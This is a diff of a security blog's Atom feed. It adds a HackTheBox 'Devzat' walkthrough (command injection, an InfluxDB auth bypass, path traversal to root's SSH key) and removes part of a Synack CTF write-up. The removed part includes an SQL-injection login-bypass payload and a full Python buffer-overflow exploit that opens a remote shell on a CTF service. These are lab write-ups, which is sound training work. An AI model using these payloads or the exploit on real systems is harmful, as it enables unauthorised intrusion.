@@ -1,4 +1,241 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-03-12T07:41:41+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Driver - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/driver.html" rel="alternate" type="text/html" title="Driver - HackTheBox" /><published>2022-02-26T00:00:00+01:00</published><updated>2022-02-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/driver</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/driver.html"><![CDATA[<p><strong>Driver</strong> is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an <em>SCF File Attack</em> to capture and crack the password of a local user using <code class="language-plaintext highlighter-rouge">responder</code>. After cracking the hash, you can exploit the <em>Print Nightmare</em> vulnerability to gain a privileged access to the box.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-03-12T18:36:23+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Devzat - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/devzat.html" rel="alternate" type="text/html" title="Devzat - HackTheBox" /><published>2022-03-12T00:00:00+01:00</published><updated>2022-03-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/devzat</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/devzat.html"><![CDATA[<p><strong>Devzat</strong> is a pretty easy <em>medium</em> linux box. It starts with a website that inform you about a chat service on the host accessible on port <strong>8000</strong>. Some enumeration will yield a hidden subdomain that’s vulnerable to <em>command injection</em>. Once inside the box, there is an instance of <em>InfluxDB</em> running locally that’s vulnerable to <strong>CVE-2019-20933</strong>, which you can use to gain access to the box as another local user. Privesc involves exploiting a <em>path traversal</em> flaw in a custom code.</p>
+
+<p><br /></p>
+
+<h3 id="info">Info</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/20211017084731.png" alt="" /></p>
+
+<p><img src="/assets/img/20211017084810.png" alt="" />
+<br /></p>
+
+<hr />
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+
+<pre><code class="language-raw"># Nmap 7.70 scan initiated Sun Oct 17 08:49:05 2021 as: nmap -sV -sC -oN nmap.txt 10.10.11.118
+Nmap scan report for 10.10.11.118
+Host is up (0.23s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://devzat.htb/
+8000/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-Go
+| ssh-hostkey: 
+|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.70%I=7%D=10/17%Time=616BD594%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,C,"SSH-2\.0-Go\r\n");
+Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 17 08:50:17 2021 -- 1 IP address (1 host up) scanned in 71.63 seconds
+</code></pre>
+<p><br /></p>
+
+<h3 id="web">Web</h3>
+
+<p><img src="/assets/img/20211017085159.png" alt="" /></p>
+
+<p><img src="/assets/img/20211017085740.png" alt="" /></p>
+
+<p>Possible username <code class="language-plaintext highlighter-rouge">patrick</code>?</p>
+
+<p><img src="/assets/img/20211017085822.png" alt="" /></p>
+
+<p>Connecting to the SSH service on port <strong>8000</strong> gave the below output;</p>
+
+<p><img src="/assets/img/20211017090318.png" alt="" /></p>
+
+<p><img src="/assets/img/20211017090432.png" alt="" /></p>
+
+<p>Attempts to log in as the user <em>patrick</em> kept failing, saying it’s reserved for local use. This may be because the user <em>patrick</em> is the admin.</p>
+
+<p>Bruteforcing virtual hosts using <code class="language-plaintext highlighter-rouge">ffuf</code> discovered one;</p>
+
+<p><img src="/assets/img/20211017092446.png" alt="" />
+<br /></p>
+
+<hr />
+<h3 id="pets">Pets</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/20211017092715.png" alt="" /></p>
+
+<p><img src="/assets/img/20211017092740.png" alt="" /></p>
+
+<p>The add pet form above is used to add an entry to the pets list. Adding a pet generated the request;</p>
+
+<p><img src="/assets/img/20211017093153.png" alt="" /></p>
+
+<p>Bruteforcing the web root with <code class="language-plaintext highlighter-rouge">ffuf</code> kept giving <strong>200</strong> responses, even for invalid paths. Viewing the page source showed it is dynamically generated by a JavaScript code;</p>
+
+<p><img src="/assets/img/20211017093348.png" alt="" /></p>
+
+<p>So I downloaded the file and parsed it with <code class="language-plaintext highlighter-rouge">js-beautify</code> for easier analysis. I found the block of code that generates the request used for adding pets, and nothing more of interest;</p>
+
+<p><img src="/assets/img/20211017094040.png" alt="" /></p>
+
+<p>Newly added pet entries can be seen immediately after they have been added, but refreshing the page makes them disappear.
+<br /></p>
+
+<h4 id="fuzzing-the-json-data">Fuzzing the JSON data</h4>
+<p><br /></p>
+
+<p>Deleting all the parameters doesn’t have any visible effect on the parser at first, and the web app responded with <strong>Pet was added successfully</strong>. Breaking the JSON syntax produced an error message;</p>
+
+<p><img src="/assets/img/20211017095228.png" alt="" /></p>
+
+<p>Sometimes even after getting a success message from the POST request, reloading the JSON data does not show the new pet entry. However, after submitting only the <code class="language-plaintext highlighter-rouge">name</code> parameter, reloading the pets JSON data by sending GET request to <code class="language-plaintext highlighter-rouge">/api/pet</code> showed a new response;</p>
+
+<p><img src="/assets/img/20211017102637.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">species</code> parameter is not being returned in the JSON data of the pets, but appears to be used to construct the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter that describes the species. I assumed it’s being used to load the characteristics data, which will make it an interesting target for injection attacks like LFI and SQLi.</p>
+
+<p>After adding a <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the submitted JSON, it is overwritten in the JSON response obtained if the value given to the <code class="language-plaintext highlighter-rouge">species</code> parameter is valid (e.g: <code class="language-plaintext highlighter-rouge">cat</code>), but if it is not valid, the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the JSON response gets set to <code class="language-plaintext highlighter-rouge">exit status 1</code>.</p>
+
+<p>The message <code class="language-plaintext highlighter-rouge">exit status 1</code> is very interesting because that is usually the result of a function call or some system command. Return codes that are not equal to <code class="language-plaintext highlighter-rouge">0</code> usually indicate an error. So I started fuzzing the <code class="language-plaintext highlighter-rouge">species</code> and <code class="language-plaintext highlighter-rouge">characteristics</code> parameters for <em>Command Injection</em> flaws, and caught a break. The parameter <code class="language-plaintext highlighter-rouge">species</code> is vulnerable to command injection;</p>
+
+<p><img src="/assets/img/20211017110307.png" alt="" /></p>
+
+<p><img src="/assets/img/20211017110358.png" alt="" /></p>
+
+<p>I then exploited the command injection to gain access to the box as the user <code class="language-plaintext highlighter-rouge">patrick</code>;</p>
+
+<p><img src="/assets/img/20211017110726.png" alt="" /></p>
+
+<p>Going through the source code of the web app at <code class="language-plaintext highlighter-rouge">/home/patrick/pets</code>, I found the vulnerable code that let me in;</p>
+
+<p><img src="/assets/img/20211017111317.png" alt="" /></p>
+
+<p>It looks like the code is also vulnerable to <em>local file inclusion (LFI)</em>.</p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="user">User</h3>
+<p><br /></p>
+
+<p>The user <code class="language-plaintext highlighter-rouge">patrick</code> does not have the user flag, but it was found in the home of <code class="language-plaintext highlighter-rouge">catherine</code>.</p>
+
+<p>Inside the home directory of <em>patrick</em>, source code for the web apps were found, including a binary named <code class="language-plaintext highlighter-rouge">petshop</code> in the <code class="language-plaintext highlighter-rouge">~/pets</code> directory.</p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">linPEAS</code> and manual enumeration didn’t yield anything interesting. <code class="language-plaintext highlighter-rouge">netstat</code> idenitified a bunch of locally running services, so I setup some SSH tunnels so I can scan them from my box;</p>
+
+<p><img src="/assets/img/20211019010046.png" alt="" /></p>
+
+<p>I then ran an <code class="language-plaintext highlighter-rouge">nmap</code> scan on the ports to identify the services they are running;</p>
+
+<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct 19 01:02:17 2021 as: nmap -sV -p6010,8443,53,8086 -oN nmap-hidden.txt localhost
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00023s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE  SERVICE VERSION
+53/tcp   closed domain
+6010/tcp open   x11?
+8086/tcp open   http    InfluxDB http admin 1.7.5
+8443/tcp open   ssh     (protocol 2.0)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.70%I=7%D=10/19%Time=616E0B10%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,C,"SSH-2\.0-Go\r\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct 19 01:03:12 2021 -- 1 IP address (1 host up) scanned in 55.43 seconds
+</code></pre>
+
+<p>The service on port <strong>8086</strong> has been identified as a HTTP service, and viewing it in a browser just give a <strong>404 Not found</strong>. Bruteforcing with <strong>ffuf</strong> found a few paths;</p>
+
+<p><img src="/assets/img/20211019010801.png" alt="" /></p>
+
+<p>Going to the <code class="language-plaintext highlighter-rouge">/query</code> path gave an authentication prompt;</p>
+
+<p><img src="/assets/img/20211019011007.png" alt="" /></p>
+
+<p>Googling showed that the version of <strong>InfluxDB</strong> on the host is vulnerable to authentication bypass, and was exploited using a python code obtained from the repo https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</p>
+
+<p><img src="/assets/img/20211019014045.png" alt="" /></p>
+
+<p><em>InfluxDB</em> is something I have never came across before, so I had to do a lot of googling to learn about it. Using a cheatsheet I found on <em>GitHub</em> at https://gist.github.com/tomazursic/6cc217e2644c619ceceefb8ce824925b, I was able to enumerate the service and found a hash for the user <code class="language-plaintext highlighter-rouge">catherine</code> in the <strong>devzat</strong> database inside the <strong>user</strong> measurement;</p>
+
+<p><img src="/assets/img/20211019165251.png" alt="" /></p>
+
+<p><img src="/assets/img/20211019165415.png" alt="" /></p>
+
+<p>The password <code class="language-plaintext highlighter-rouge">woBeeYareedahc7Oogeephies7Aiseci</code> does not appear to be a hash, so I just used to access the account of <em>catherine</em> on the host, and it worked;</p>
+
+<p><img src="/assets/img/20211019165646.png" alt="" />
+<br /></p>
+
+<hr />
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p>The user <em>catherine</em> does not have permission to run any command on the host using <code class="language-plaintext highlighter-rouge">sudo</code>. No files of interest were found in her home directory, so I ran <code class="language-plaintext highlighter-rouge">linPEAS</code> again in hope of finding something new, but it didn’t.</p>
+
+<p>Inside <code class="language-plaintext highlighter-rouge">/var/backups</code>, 2 backup files belonging to <em>catherine</em> were found. The files were extracted, but nothing of interest was found inside at a quick glance;</p>
+
+<p><img src="/assets/img/20211019172320.png" alt="" /></p>
+
+<p>Connecting to the SSH chat service locally on port <strong>8443</strong> as <em>catherine</em> showed some interesting messages from <em>patrick</em>;</p>
+
+<p><img src="/assets/img/20211019214956.png" alt="" /></p>
+
+<p>Since the default backups directory in linux is <code class="language-plaintext highlighter-rouge">/var/backups</code>, and the only files of interest in the directory are the previously discovered <em>.zip</em> files, I extracted them again to <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and run the <code class="language-plaintext highlighter-rouge">diff</code> command on their extracted files, and found a password <code class="language-plaintext highlighter-rouge">CeilingCatStillAThingIn2021?</code>;</p>
+
+<p><img src="/assets/img/20211019215441.png" alt="" /></p>
+
+<p>Attempt to login as the root user using the password failed. In the text messages <em>patrick</em> talked about implementing a new feature that requires a password, so I continue to examine the output generated by the <code class="language-plaintext highlighter-rouge">diff</code> command, and noticed a function that appears to be used to read files from disk provided a path and a valid password were provided;</p>
+
+<p><img src="/assets/img/20211019220815.png" alt="" /></p>
+
+<p>So I logged back into the chat app as <em>catherine</em> and listed available commands using the <code class="language-plaintext highlighter-rouge">/help</code> command. One entry stood out;</p>
+
+<p><img src="/assets/img/20211019220941.png" alt="" /></p>
+
+<p>This is likely the command used to invoke the function used to read files using a path and a password. So I tried to read the file <code class="language-plaintext highlighter-rouge">/etc/hostname</code> to see if it works, which did not work because the application is prefixing <code class="language-plaintext highlighter-rouge">/root/devzat</code> to the filename given, as indicated by the error message. Using a simple path traversal payload, I was able to read the SSH key file of the <code class="language-plaintext highlighter-rouge">root</code> user;</p>
+
+<p><img src="/assets/img/20211019221352.png" alt="" /></p>
+
+<p>I copied the SSH key to my attack box, and used it to access the box as the <code class="language-plaintext highlighter-rouge">root</code> user over SSH;</p>
+
+<p><img src="/assets/img/20211019221510.png" alt="" />
+<br /></p>
+
+<hr />
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>Identified services running on the host using <code class="language-plaintext highlighter-rouge">nmap</code></li>
+  <li>Found the username <strong>patrick</strong> on the web page, which is not allowed to be used remotely on the SSH chat service.</li>
+  <li>Found a hidden subdomain <strong>pets.devzat.htb</strong> using <code class="language-plaintext highlighter-rouge">ffuf</code>
+    <ul>
+      <li>Fuzzing the JSON data submitted to the web app via POST request uncovered a <em>command injection</em> flaw, which was exploited to gain access to the box as the user <strong>patrick</strong>.</li>
+    </ul>
+  </li>
+  <li>Inside the box as <strong>patrick</strong>;
+    <ul>
+      <li>Identified another user named <strong>catherine</strong>.</li>
+      <li>Discovered a local installation of <em>InfluxDB</em> that is vulnerable to authentication bypass, and was enumerated to obtain a password that gave access to the account of <strong>catherine</strong>.</li>
+    </ul>
+  </li>
+  <li>Inside the box as <strong>catherine</strong>;
+    <ul>
+      <li>Connected to the local SSH chat service on port <strong>8443</strong> as <strong>catherine</strong>.</li>
+      <li>Received a chat log between <strong>patrick</strong> and <strong>catherine</strong> discussing a new feature that is password-protected, with the password obtainable from backup files in the default linux backups directory.</li>
+      <li>Located the password inside the backups and used it to access the feature, which is used to read files from disk. I used it to load the SSH private key of the root user.</li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="linux" /><category term="cve" /><category term="command injection" /><category term="influxdb" /><category term="path traversal" /><category term="tunneling" /><category term="custom exploitation" /><summary type="html"><![CDATA[Devzat is a pretty easy medium linux box. It starts with a website that inform you about a chat service on the host accessible on port 8000. Some enumeration will yield a hidden subdomain that’s vulnerable to command injection. Once inside the box, there is an instance of InfluxDB running locally that’s vulnerable to CVE-2019-20933, which you can use to gain access to the box as another local user. Privesc involves exploiting a path traversal flaw in a custom code.]]></summary></entry><entry><title type="html">Driver - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/driver.html" rel="alternate" type="text/html" title="Driver - HackTheBox" /><published>2022-02-26T00:00:00+01:00</published><updated>2022-02-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/driver</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/driver.html"><![CDATA[<p><strong>Driver</strong> is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an <em>SCF File Attack</em> to capture and crack the password of a local user using <code class="language-plaintext highlighter-rouge">responder</code>. After cracking the hash, you can exploit the <em>Print Nightmare</em> vulnerability to gain a privileged access to the box.</p>
 
 <h3 id="about">About</h3>
 <p><br /></p>
@@ -2333,254 +2570,4 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>Found a privilege escalation exploit on https://gtfobins.github.io, which gave me root access to the box.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="apache tomcat" /><category term="web proxy" /><category term="git" /><category term="gitbucket" /><category term="open signup" /><category term="path normalization" /><category term="ansible playbook" /><summary type="html"><![CDATA[Seal is a medium linux box. It features a web service on port 443 running Apache Tomcat, and a GitBucket installation running locally, but accessible through the proxy on port 8080 (nginx). The GitBucket allows a user to create an account, which I did. Once inside, I recovered a password in a previous commit in one of the repositories. This credential was accepted by the tomcat admin login page, but access to the panel was blocked by nginx. This was bypassed thanks to a path normalization vulnerability, and the .war upload used to deploy web applications in tomcat was used to gain code execution on the server.]]></summary></entry><entry><title type="html">Synack Red Team 5 CTF</title><link href="https://4g3nt47.github.io/posts/ctf/synack5.html" rel="alternate" type="text/html" title="Synack Red Team 5 CTF" /><published>2021-11-08T00:00:00+01:00</published><updated>2021-11-08T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/ctf/synack5</id><content type="html" xml:base="https://4g3nt47.github.io/posts/ctf/synack5.html"><![CDATA[<p><strong>Synack Red Team 5 CTF</strong> was (iirc) my third CTF, and the first in which I actually managed to score some decent points. It’s a jeopardy-styled CTF featuring 6 categories (web, pwn, crypto, forensics, misc, and reversing). I managed to solve 16 out of the 25 total challenges, solving at least one challenge in each category. My strongest category was web, in which I solved 5 out of 6 challenges. I eventually finished <code class="language-plaintext highlighter-rouge">46th</code> out of <code class="language-plaintext highlighter-rouge">333</code> participants, which was narrowly within my target of top 50, and for that I am happy :)</p>
-
-<p><br /></p>
-
-<h3 id="web">Web</h3>
-
-<h4 id="simplay"><strong>SimPlay</strong></h4>
-
-<p>This was a web challenge with downloadable source code. Going through the source files, the file <code class="language-plaintext highlighter-rouge">TimeModel.php</code> was found to be making a call to <code class="language-plaintext highlighter-rouge">eval()</code> using user-controlled data that was passed to it by <code class="language-plaintext highlighter-rouge">TimeController.php</code></p>
-
-<p><img src="/assets/img/2021-11-05_22-40.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-05_22-41.png" alt="" /></p>
-
-<p>I exploited this to identify, and read the flag;</p>
-
-<p><img src="/assets/img/2021-11-05_22-41_1.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-05_22-41_2.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="potentquotes"><strong>PotentQuotes</strong></h4>
-
-<p>This challenge featured a login form asking for username and password. The username field was vulnerable to <em>SQL Injection</em>, and authentication was bypassed using the payload <code class="language-plaintext highlighter-rouge">admin' or 1=1-- -</code>.</p>
-
-<p><br /></p>
-
-<h4 id="bonechewercone"><strong>BoneChewerCone</strong></h4>
-
-<p>The website in this challenge was vulnerable to <em>Server Side Template Injection (SSTI)</em>. The flag was found in the output of <code class="language-plaintext highlighter-rouge">config.items()</code></p>
-
-<p><img src="/assets/img/2021-11-05_16-04.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="imf---landing"><strong>IMF - Landing</strong></h4>
-
-<p>This was a fun web challenge that features <em>Local File Inclusion (LFI)</em> vulnerability in the website served by <em>Nginx</em>. It was a PHP site, and I was able to gain code execution by chaining the LFI with <strong>log poisoning</strong> to execute PHP payloads;</p>
-
-<p><img src="/assets/img/2021-11-05_22-17_1.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-05_22-18.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-05_22-18_1.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-05_22-16.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="imf---the-search"><strong>IMF - The Search</strong></h4>
-
-<p>The website in this challenge had a feature that allowed users to search for “agents”. It was <em>NodeJS</em> application, and it’s vulnerable to <em>Server Side Template Injection (SSTI)</em> using the <em>pug</em> engine;</p>
-
-<p><img src="/assets/img/2021-11-05_23-02.png" alt="" /></p>
-
-<p>Using some node tutorials to execute shell commands, I was able to craft a payload to execute a shell command on the host, but I could not get it to return any output. Attempts to redirect output to local files so I can read it using GET requests were unsuccessful as the server appeared to be only allowing requests to paths with existing mappings.</p>
-
-<p>I was eventually able to read output by overwriting the site’s logo, and then viewing it using <code class="language-plaintext highlighter-rouge">curl</code>;</p>
-
-<p><img src="/assets/img/2021-11-07_14-03.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-07_14-04.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-07_14-05.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-07_14-06.png" alt="" /></p>
-
-<p><br /></p>
-
-<h3 id="crypto">Crypto</h3>
-
-<h4 id="weak-rsa"><strong>Weak RSA</strong></h4>
-
-<p>This is a downloadable challenge that provide a public key, and an encrypted message. Using the program https://github.com/Ganapati/RsaCtfTool, and <code class="language-plaintext highlighter-rouge">openssl</code>, I was able to decrypt the message after recovering the private key;</p>
-
-<p><img src="/assets/img/2021-11-07_08-09.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-07_08-10.png" alt="" /></p>
-
-<p><br /></p>
-
-<h3 id="reversing">Reversing</h3>
-
-<h4 id="access"><strong>Access</strong></h4>
-
-<p>This was a simple reversing challenge that I solved by patching the binary using <code class="language-plaintext highlighter-rouge">cutter</code>, forcing it to continuously execute the block of code that compares user input to the hidden key, which I extracted one character at a time;</p>
-
-<p><img src="/assets/img/2021-11-06_07-38.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-06_07-38_1.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="check"><strong>Check</strong></h4>
-
-<p>This challenge provides a binary that compares user input to a value. I was able to solve this by setting a breakpoint where the comparison was carried out, and dumping the data at the memory location using <code class="language-plaintext highlighter-rouge">radare2</code>;</p>
-
-<p><img src="/assets/img/2021-11-05_17-53.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="split"><strong>Split</strong></h4>
-
-<p>The binary in this challenge tests user input against an encrypted string. The encrypted string is decrypted just before the comparison was made, and I was able to dump it by setting a breakpoint at the location;</p>
-
-<p><img src="/assets/img/2021-11-06_10-33.png" alt="" /></p>
-
-<p><br /></p>
-
-<h3 id="pwn">Pwn</h3>
-
-<h4 id="injection"><strong>Injection</strong></h4>
-
-<p>This challenge provides a downloadable binary and a TCP service through which the program can be accessed using tools like <code class="language-plaintext highlighter-rouge">netcat</code>. The downloaded binary gives an address during interaction with user, which was found to be the address of a buffer used to store user input without checking size, leading to buffer overflow;</p>
-
-<p><img src="/assets/img/Pasted image 20211107213649.png" alt="" /></p>
-
-<p>So I crafted an exploit in python that inject shellcode in the input buffer, and used the given address to overwrite the instruction pointer;</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
-</span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
-
-<span class="n">shellcode</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"dash.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="c1"># A 64-bit /bin/sh shellcode
-</span><span class="n">padding</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">18</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
-
-<span class="n">conn</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
-<span class="n">conn</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'46.101.21.240'</span><span class="p">,</span> <span class="mi">31877</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
-<span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># Select the first option
-# Extract the memory address
-</span><span class="n">data</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
-<span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"["</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"]"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
-<span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
-<span class="k">print</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
-<span class="n">rip</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">addr</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="s">"%r"</span> <span class="o">%</span><span class="p">(</span><span class="n">rip</span><span class="p">))</span>
-
-<span class="c1"># The final payload
-</span><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rip</span>
-<span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-<span class="c1"># Interactive shell for user commands.
-</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9999</span><span class="p">))</span>
-<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-  <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Input &gt; "</span><span class="p">)</span>
-  <span class="k">if</span> <span class="n">command</span><span class="p">:</span>
-    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
-    <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
-  <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>The above code gave me an interactive command shell on the box;</p>
-
-<p><img src="/assets/img/2021-11-06_12-43.png" alt="" /></p>
-
-<p><br /></p>
-
-<h3 id="forensics">Forensics</h3>
-
-<h4 id="sneaky"><strong>Sneaky</strong></h4>
-
-<p>This was a very easy forensics challenge on a <code class="language-plaintext highlighter-rouge">.pcap</code> file. Going through the file in <code class="language-plaintext highlighter-rouge">wireshark</code> showed a POST request containing the flag;</p>
-
-<p><img src="/assets/img/2021-11-05_17-11.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="top-secret"><strong>Top Secret</strong></h4>
-
-<p>This challenge featured packet analysis on a <code class="language-plaintext highlighter-rouge">.pcap</code> file captured during an FTP transfer of a PDF file. The PDF was extracted using <code class="language-plaintext highlighter-rouge">wureshark</code>, and it’s MD5 hash was the flag;</p>
-
-<p><img src="/assets/img/Pasted image 20211108185517.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="endurance-run"><strong>Endurance Run</strong></h4>
-
-<p>This challenge provides a windows registry file <code class="language-plaintext highlighter-rouge">NTUSER.DAT</code> obtained from a hacked computer. Using <code class="language-plaintext highlighter-rouge">hivexsh</code>, I was able to locate the flag in the registry, which wasn’t easy because <code class="language-plaintext highlighter-rouge">hivexsh</code> has no search feature or even tab auto-complete. I had to used <code class="language-plaintext highlighter-rouge">hivexml</code> to convert the whole registry file to an XML, which I then opened on a browser and used the “find” function to locate possible flags. I then used windows <code class="language-plaintext highlighter-rouge">cmd</code> prompt running on wine to decode the flag;</p>
-
-<p><img src="/assets/img/2021-11-06_22-09.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="phishin-impossible"><strong>Phishin Impossible</strong></h4>
-
-<p>This challenge provides <code class="language-plaintext highlighter-rouge">.pdf</code> file that was found to contain an embedded file named <code class="language-plaintext highlighter-rouge">secret_info.SettingContent-ms</code>. The file was extracted, and found to contain the flag, which had to be joined from fragments in the powershell command;</p>
-
-<p><img src="/assets/img/Pasted image 20211108191805.png" alt="" /></p>
-
-<p><br /></p>
-
-<h3 id="misc">Misc</h3>
-
-<h4 id="blobber"><strong>Blobber</strong></h4>
-
